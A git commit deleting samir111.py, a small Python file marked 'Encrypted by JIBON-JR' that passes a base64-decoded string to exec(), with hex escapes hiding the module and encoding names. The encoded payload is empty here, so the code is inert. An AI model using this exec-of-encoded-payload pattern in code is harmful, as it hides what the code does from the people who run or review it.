02ce2e122b896bbc96e3b702fad6c64376c9b4b3
kazi samir <97796921+kazisamir4@users.noreply.github.com>
2022-07-19 13:35:20 +0600

    Delete samir111.py

--- samir111.py
+++
@@ -1,6 +0,0 @@
-# Encrypted by JIBON-JR
-# Github- Ajijul123aa
-
-ssssssssssssssssssssssssssssssssssssssssssssssssss = ""
-ssssssssssssssssssssssssssssssssssssssssssssssssss += ""
-exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(ssssssssssssssssssssssssssssssssssssssssssssssssss.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
